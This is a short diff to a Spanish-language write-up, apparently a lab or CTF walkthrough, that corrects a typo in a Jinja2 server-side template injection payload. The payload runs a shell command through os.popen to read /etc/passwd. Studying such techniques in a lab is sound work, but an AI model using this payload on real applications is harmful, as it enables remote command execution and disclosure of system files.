@@ -157,7 +157,7 @@ Acabamos de encontrar un SSTI, así que vamos a intentar inyectar código malici
 Lo modificamos para ver el passwd
 
 ```bash 
-{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('cat /et/passwd').read() }}
+{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('cat /etc/passwd').read() }}
 ```
 
 Insertamos el codigo en el formulario y damos al enlace de abajo
